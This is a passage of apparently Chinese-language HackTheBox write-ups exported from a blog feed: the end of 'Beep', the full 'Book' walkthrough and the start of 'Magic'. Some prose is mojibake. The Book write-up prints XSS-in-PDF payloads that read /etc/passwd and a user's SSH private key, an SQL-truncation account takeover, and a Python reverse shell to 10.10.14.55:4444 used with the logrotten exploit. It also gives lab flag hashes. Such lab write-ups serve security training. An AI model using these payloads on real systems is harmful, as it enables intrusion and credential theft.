<p>åˆ©ç”¨payloadç›´æ¥åœ¨ç½‘é¡µä¸ŠæŸ¥çœ‹<code>/etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync</span><br><span class="line">shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown</span><br><span class="line">halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt</span><br><span class="line">mail:x:8:12:mail:&#x2F;var&#x2F;spool&#x2F;mail:&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:13:news:&#x2F;etc&#x2F;news:</span><br><span class="line">uucp:x:10:14:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;sbin&#x2F;nologin</span><br><span class="line">operator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin</span><br><span class="line">games:x:12:100:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin</span><br><span class="line">gopher:x:13:30:gopher:&#x2F;var&#x2F;gopher:&#x2F;sbin&#x2F;nologin</span><br><span class="line">ftp:x:14:50:FTP User:&#x2F;var&#x2F;ftp:&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:99:99:Nobody:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:27:27:MySQL Server:&#x2F;var&#x2F;lib&#x2F;mysql:&#x2F;bin&#x2F;bash</span><br><span class="line">distcache:x:94:94:Distcache:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">vcsa:x:69:69:virtual console memory owner:&#x2F;dev:&#x2F;sbin&#x2F;nologin</span><br><span class="line">pcap:x:77:77::&#x2F;var&#x2F;arpwatch:&#x2F;sbin&#x2F;nologin</span><br><span class="line">ntp:x:38:38::&#x2F;etc&#x2F;ntp:&#x2F;sbin&#x2F;nologin</span><br><span class="line">cyrus:x:76:12:Cyrus IMAP Server:&#x2F;var&#x2F;lib&#x2F;imap:&#x2F;bin&#x2F;bash</span><br><span class="line">dbus:x:81:81:System message bus:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">apache:x:48:48:Apache:&#x2F;var&#x2F;www:&#x2F;sbin&#x2F;nologin</span><br><span class="line">mailman:x:41:41:GNU Mailing List Manager:&#x2F;usr&#x2F;lib&#x2F;mailman:&#x2F;sbin&#x2F;nologin</span><br><span class="line">rpc:x:32:32:Portmapper RPC user:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">postfix:x:89:89::&#x2F;var&#x2F;spool&#x2F;postfix:&#x2F;sbin&#x2F;nologin</span><br><span class="line">asterisk:x:100:101:Asterisk VoIP PBX:&#x2F;var&#x2F;lib&#x2F;asterisk:&#x2F;bin&#x2F;bash</span><br><span class="line">rpcuser:x:29:29:RPC Service User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologin</span><br><span class="line">nfsnobody:x:65534:65534:Anonymous NFS User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:&#x2F;var&#x2F;empty&#x2F;sshd:&#x2F;sbin&#x2F;nologin</span><br><span class="line">spamfilter:x:500:500::&#x2F;home&#x2F;spamfilter:&#x2F;bin&#x2F;bash</span><br><span class="line">haldaemon:x:68:68:HAL daemon:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">xfs:x:43:43:X Font Server:&#x2F;etc&#x2F;X11&#x2F;fs:&#x2F;sbin&#x2F;nologin</span><br><span class="line">fanis:x:501:501::&#x2F;home&#x2F;fanis:&#x2F;bin&#x2F;bash</span><br><span class="line">Sorry! Attempt to access restricted file.</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨<code>fanis : jEhdIekWmdjE</code>ç™»å½•é¶æœºå‘ç°å¯†ç é”™è¯¯ï¼Œå†ä¸€çœ‹Writeupï¼Œç›´æ¥æ˜¯å¯ä»¥rootç™»å½•â€¦orz==</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> kali @ kali <span class="keyword">in</span> ~/HackTheBox/Beep [9:19:31] </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ssh root@10.10.10.7</span></span><br><span class="line">root@10.10.10.7&#x27;s password: </span><br><span class="line">Last login: Tue Apr  7 16:20:42 2020 from 10.10.14.5</span><br><span class="line"></span><br><span class="line">Welcome to Elastix </span><br><span class="line">----------------------------------------------------</span><br><span class="line"></span><br><span class="line">To access your Elastix System, using a separate workstation (PC/MAC/Linux)</span><br><span class="line">Open the Internet Browser using the following URL:</span><br><span class="line">http://10.10.10.7</span><br><span class="line"></span><br><span class="line">[root@beep ~]# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</span><br><span class="line">[root@beep ~]# cat /root/root.txt </span><br><span class="line">d88e006123842106982acce0aaf453f0</span><br><span class="line">[root@beep ~]# cat /home/fanis/user.txt </span><br><span class="line">aeff3def0c765c2677b94715cffa73ac</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Book-walkthrough</title>
    <url>/Target_drone/HackTheBox/14.HTB-Book-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Book-Walkthrough">HTB::Book Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414142044.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>dirb</li>
<li>pspy</li>
<li>SQL  Truncate</li>
<li>XSS LFI</li>
<li>logrotate exp</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<p>ç«¯å£æ‰«æ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Fri Apr  3 22:48:24 2020 as: nmap -sC -sV -Pn -oN ippsec_scan.txt 10.10.10.176</span><br><span class="line">Nmap scan report for 10.10.10.176</span><br><span class="line">Host is up (0.43s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)</span><br><span class="line">|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)</span><br><span class="line">|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   &#x2F;: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: LIBRARY - Read | Learn | Have Fun</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Fri Apr  3 22:49:38 2020 -- 1 IP address (1 host up) scanned in 73.80 seconds</span><br></pre></td></tr></table></figure>
<p>è·¯å¾„æ‰«æ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ dirb http:&#x2F;&#x2F;10.10.10.176                                                           -----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------                                                                     </span><br><span class="line"></span><br><span class="line">START_TIME: Tue Apr 14 02:23:14 2020</span><br><span class="line">URL_BASE: http:&#x2F;&#x2F;10.10.10.176&#x2F;</span><br><span class="line">WORDLIST_FILES: &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">-----------------                                                                     GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http:&#x2F;&#x2F;10.10.10.176&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;docs&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;images&#x2F;</span><br><span class="line"></span><br><span class="line">+ http:&#x2F;&#x2F;10.10.10.176&#x2F;index.php (CODE:200|SIZE:6800)</span><br><span class="line">+ http:&#x2F;&#x2F;10.10.10.176&#x2F;server-status (CODE:403|SIZE:277)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;export&#x2F;</span><br><span class="line">+ http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;index.php (CODE:200|SIZE:6291)</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F;</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;docs&#x2F; ----</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;images&#x2F; ----</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;export&#x2F; ----</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F;composer&#x2F;</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;10.10.10.176&#x2F;admin&#x2F;vendor&#x2F;composer&#x2F; ----</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Tue Apr 14 04:45:39 2020</span><br><span class="line">DOWNLOADED: 32284 - FOUND: 4</span><br></pre></td></tr></table></figure>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>æŸ¥çœ‹80ç«¯å£ï¼Œæœ‰ä¸€ä¸ªç™»å½•å’Œæ³¨å†Œé¡µé¢ï¼Œæˆ‘ä»¬å…ˆæ­£å¸¸æ³¨å†Œå’Œç™»å½•ä¹‹åè¿›ç«™ç‚¹çœ‹çœ‹ï¼Œæœ‰ä¸‰ä¸ªç‚¹å€¼å¾—æ³¨æ„ï¼š</p>
<ul>
<li>Contact Usç•Œé¢è¡¨æ˜äº†æœ‰ä¸€ä¸ªç®¡ç†å‘˜è´¦å·<code>admin@book.htb</code></li>
<li>View Profileç•Œé¢è¡¨æ˜äº†ç°åœ¨è´¦å·çš„æƒé™æ˜¯<code>User</code></li>
<li>Collectionsç•Œé¢æœ‰ä¸€ä¸ªä¸Šä¼ åŠŸèƒ½</li>
</ul>
<p>é¦–å…ˆå°è¯•èƒ½ä¸èƒ½å‚ç›´è¶Šæƒï¼Œç”¨<code>admin@book.htb</code>æ³¨å†Œè´¦å·ï¼ŒBurpæ‹¦æˆªè¯·æ±‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.10.176</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;10.10.10.176&#x2F;index.php</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 49</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID&#x3D;mq1sob5pmstq0i55csvmlafcre</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name&#x3D;admin&amp;email&#x3D;admin@book.htb&amp;password&#x3D;123321</span><br></pre></td></tr></table></figure>
<p>å¹¶ä¸”æŸ¥çœ‹æ³¨å†Œé¡µé¢æºç å‘ç°emailå­—æ®µæœ‰JSéªŒè¯</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validateForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="built_in">document</span>.forms[<span class="string">&quot;myForm&quot;</span>][<span class="string">&quot;name&quot;</span>].value;</span><br><span class="line">  <span class="keyword">var</span> y = <span class="built_in">document</span>.forms[<span class="string">&quot;myForm&quot;</span>][<span class="string">&quot;email&quot;</span>].value;</span><br><span class="line">  <span class="keyword">if</span> (x == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    alert(<span class="string">&quot;Please fill name field. Should not be more than 10 characters&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (y == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    alert(<span class="string">&quot;Please fill email field. Should not be more than 20 characters&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„è¶Šæƒæ–¹å¼ï¼šåœ¨<code>admin@book.htb</code>åé¢ç”¨ç©ºæ ¼å¡«å……è‡³20ä¸ªå­—ç¬¦åœ¨åŠ ä¸Šä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œä¸€å…±21ä¸ªå­—ç¬¦ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;admin&amp;email&#x3D;admin@book.htb      C&amp;password&#x3D;123321</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414221831.png" alt=""></p>
<p>æ³¨å†ŒæˆåŠŸåï¼Œç”¨<code>admin@book.htb</code>ç™»å½•ç«™ç‚¹ï¼Œå‘ç°è‡ªå·±çš„èº«ä»½ä»ç„¶æ˜¯<code>User</code>ï¼Œè½¬è€Œåˆ°<code>http://10.10.10.176/admin</code>é¡µé¢ç™»å½•ï¼Œç„¶è€Œç»“æœæ˜¯Nopeï¼ŒçŒœæµ‹ä¸€ä¸‹åŸå› å¯èƒ½æ˜¯å› ä¸º<code>name</code>å­—æ®µé‡å¤ï¼Œå†é‡æ–°èµ°ä¸€éæ³¨å†Œæµç¨‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;admin2&amp;email&#x3D;admin@book.htb      C&amp;password&#x3D;123321</span><br></pre></td></tr></table></figure>
<p>ç™»å½•adminç«™ç‚¹æˆåŠŸã€‚æ¥ç€å¼€å§‹å°è¯•Collectionsæ¨¡å—ï¼Œåœ¨ç”¨æˆ·ç«¯ä¸Šä¼ ä¸€ä¸ªpdfæ–‡ä»¶ï¼Œå†…å®¹éšæ„</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414222115.png" alt=""></p>
<p>åœ¨ç®¡ç†é¢æ¿ä¸­ä¸‹è½½Collections PDF</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414221929.png"  />
<p>å¯ä»¥çœ‹åˆ°åˆšåˆšä¸Šä¼ çš„pdfæ–‡ä»¶</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414222347.png" style="zoom: 80%;" />
<p>æ¢³ç†ä¸€ä¸‹é€»è¾‘ï¼Œæˆ‘ä»¬æä¾›çš„æ•°æ®å¯ä»¥å‘ˆç°åœ¨pdfä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡XSSæå–æœ¬åœ°æ–‡ä»¶ã€‚Googleä¸€ä¸‹LFI XSSï¼ŒNoob-ninjaå·²ç»æä¾›äº†ç›¸å…³çš„åˆ©ç”¨æ–¹å¼ï¼š<a href="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html">https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html</a></p>
<p>payloadï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;x=<span class="keyword">new</span> XMLHttpRequest;x.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">document</span>.write(<span class="built_in">this</span>.responseText)&#125;;x.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);x.send();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414223957.png" style="zoom: 80%;" />
<p>ä¸Šä¼ ä¹‹åå†ä»ç®¡ç†é¢æ¿ä¸‹è½½Collections PDF</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414224229.png" style="zoom:50%;" />
<p>æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªç”¨æˆ·å<code>reader</code>ï¼Œå†å»ä¸»ç›®å½•æ‹¿SSH key</p>
<p>payloadï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;x=<span class="keyword">new</span> XMLHttpRequest;x.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">document</span>.write(<span class="built_in">this</span>.responseText)&#125;;x.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///home/reader/.ssh/id_rsa&quot;</span>);x.send();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414224525.png" style="zoom:50%;" />
<p>ä½†æ˜¯PDFæ˜¾ç¤ºæœ‰é—®é¢˜ï¼Œç”¨pdfminner.sixå·¥å…·è½¬æ¢æˆtext</p>
<blockquote>
<p><a href="https://github.com/pdfminer/pdfminer.six">https://github.com/pdfminer/pdfminer.six</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python3 tools&#x2F;pdf2text.py 68498.pdf &gt; id_rsa</span><br></pre></td></tr></table></figure>
<p>SSH reader login</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ssh -i id_rsa.txt reader@book.htb</span><br><span class="line">The authenticity of host &#39;book.htb (10.10.10.176)&#39; can&#39;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:QRw8pCXg7E8d9sWI+0Z9nZxClJiq9&#x2F;eAeT&#x2F;9wUfoQQk.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#39;book.htb&#39; (ECDSA) to the list of known hosts.</span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU&#x2F;Linux 5.4.1-050401-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">  System information as of Mon Mar  2 15:30:16 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.28               Processes:            194</span><br><span class="line">  Usage of &#x2F;:   27.1% of 19.56GB   Users logged in:      1</span><br><span class="line">  Memory usage: 39%                IP address for ens33: 10.10.10.176</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available for installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https:&#x2F;&#x2F;ubuntu.com&#x2F;livepatch</span><br><span class="line"></span><br><span class="line">114 packages can be updated.</span><br><span class="line">0 updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https:&#x2F;&#x2F;changelogs.ubuntu.com&#x2F;meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Apr 14 06:05:21 2020 from 10.10.17.235</span><br><span class="line">reader@book:~$ id</span><br><span class="line">uid&#x3D;1000(reader) gid&#x3D;1000(reader) groups&#x3D;1000(reader)</span><br><span class="line">reader@book:~$ ls</span><br><span class="line">backups  lse.sh  user.txt</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p>ä¸»ç›®å½•ä¸‹æœ‰ä¸€ä¸ªbackupsæ–‡ä»¶å¤¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reader@book:~$ cd backups&#x2F;</span><br><span class="line">reader@book:~&#x2F;backups$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 reader reader 4096 Jan 29 13:05 .</span><br><span class="line">drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..</span><br><span class="line">-rw-r--r-- 1 reader reader    0 Jan 29 13:05 access.log</span><br><span class="line">-rw-r--r-- 1 reader reader   91 Jan 29 13:05 access.log.1</span><br><span class="line">reader@book:~&#x2F;backups$ cat access.log.1 </span><br><span class="line">192.168.0.104 - - [29&#x2F;Jun&#x2F;2019:14:39:55 +0000] &quot;GET &#x2F;robbie03 HTTP&#x2F;1.1&quot; 404 446 &quot;-&quot; &quot;curl&quot;</span><br></pre></td></tr></table></figure>
<p>ç”¨pspyç›‘æ§é¶æœºè¿è¡Œçš„æœåŠ¡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2020&#x2F;04&#x2F;14 10:17:39 CMD: UID&#x3D;0    PID&#x3D;78202  | sleep 5 </span><br><span class="line">2020&#x2F;04&#x2F;14 10:17:44 CMD: UID&#x3D;0    PID&#x3D;78205  | &#x2F;usr&#x2F;sbin&#x2F;logrotate -f &#x2F;root&#x2F;log.cfg </span><br><span class="line">2020&#x2F;04&#x2F;14 10:17:44 CMD: UID&#x3D;0    PID&#x3D;78204  | &#x2F;bin&#x2F;sh &#x2F;root&#x2F;log.sh </span><br><span class="line">2020&#x2F;04&#x2F;14 10:17:44 CMD: UID&#x3D;0    PID&#x3D;78206  | sleep 5 </span><br></pre></td></tr></table></figure>
<p>å¦‚æœlogrotateæ˜¯ä»¥rootèº«ä»½è¿è¡Œï¼Œå¹¶ä¸”æ™®é€šç”¨æˆ·å¯¹logrotateè½®è¯¢çš„æ—¥å¿—æ–‡ä»¶å…·æœ‰å†™çš„æƒé™ï¼Œé‚£ä¹ˆå°±æœ‰ä¸€ç§æ¼æ´åˆ©ç”¨å¯ä»¥ææƒã€‚æˆ‘ä»¬å…ˆæ¥éªŒè¯ä¸€ä¸‹access.logæ˜¯ä¸æ˜¯è½®è¯¢çš„æ–‡ä»¶ï¼Œå‘å…¶ä¸­å†™å…¥10Mçš„éšæœºæ¯”ç‰¹æµæ•°æ®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reader@book:~&#x2F;backups$ head -c 10M &lt; &#x2F;dev&#x2F;urandom &gt; access.log</span><br><span class="line">reader@book:~&#x2F;backups$ ls -la</span><br><span class="line">total 10252</span><br><span class="line">drwxr-xr-x 2 reader reader     4096 Jan 29 13:05 .</span><br><span class="line">drwxr-xr-x 7 reader reader     4096 Jan 29 13:05 ..</span><br><span class="line">-rw-r--r-- 1 reader reader 10485760 Apr 15 02:35 access.log</span><br><span class="line">-rw-r--r-- 1 reader reader       91 Jan 29 13:05 access.log.1</span><br><span class="line">reader@book:~&#x2F;backups$ ls -la</span><br><span class="line">total 10252</span><br><span class="line">drwxr-xr-x 2 reader reader     4096 Apr 15 02:35 .</span><br><span class="line">drwxr-xr-x 7 reader reader     4096 Jan 29 13:05 ..</span><br><span class="line">-rw-r--r-- 1 reader reader        0 Apr 15 02:35 access.log</span><br><span class="line">-rw-r--r-- 1 reader reader 10485760 Apr 15 02:35 access.log.1</span><br><span class="line">-rw-r--r-- 1 reader reader       91 Jan 29 13:05 access.log.2</span><br></pre></td></tr></table></figure>
<p>å¾ˆæ˜æ˜¾ï¼Œå¤šäº†ä¸€ä¸ª<code>access.log.2</code>æ—¥å¿—æ–‡ä»¶ã€‚</p>
<p>ä»https://github.com/whotwagner/logrottenä¸‹è½½logrotate exploitåˆ°æœ¬æœºï¼Œä¸Šä¼ è‡³é¶æœºçš„ä¸»ç›®å½•å¹¶ç¼–è¯‘ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reader@book:~ gcc -o logrotten logrotten.c</span><br></pre></td></tr></table></figure>
<p>å†å‡†å¤‡ä¸€ä¸ªpayloadfileï¼Œå†™å…¥reverse shellï¼Œåœ¨æœ¬æœºç›‘å¬4444ç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reader@book:~ cat payloadfile</span><br><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.55&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
<p>ç„¶åæ‰§è¡Œexploit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reader@book:~ .&#x2F;logrotten -p .&#x2F;payloadfile &#x2F;home&#x2F;reader&#x2F;backups&#x2F;access.log</span><br><span class="line">Waiting for rotating backups&#x2F;access.log...</span><br></pre></td></tr></table></figure>
<p>äºæ­¤åŒæ—¶ï¼Œåœ¨å¦å¤–ä¸€ä¸ªç»ˆç«¯ç™»å½•é¶æœºï¼Œå‘è½®è¯¢æ—¥å¿—ä¸­å†™å…¥éšæœºæ•°æ®ï¼Œè§‚å¯Ÿä¸»æœº4444ç«¯å£ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$nc -nlvp 1234</span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">connect to [10.10.15.152] from (UNKNOWN) [10.10.10.176] 50008</span><br><span class="line"># cat &#x2F;root&#x2F;root.txt</span><br><span class="line">84da9--------------------0dd89714</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Reference">0x04 Reference</h2>
<p><a href="https://github.com/whotwagner/logrotten">https://github.com/whotwagner/logrotten</a></p>
<p><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf">https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf</a></p>
<p><a href="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html">https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Magic-Walkthrough</title>
    <url>/Target_drone/HackTheBox/15.HTB-Magic-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Magic-Walkthrough">HTB::Magic Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200428124359.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>exiftool</li>
<li><code>LinEnum.sh</code></li>
<li>SQL Injection</li>
<li>mysqldump</li>
<li>sysinfo</li>
<li>PATH variable</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enueration">Initial Enueration</h3>
<p>ç«¯å£æ‰«æï¼š</p>
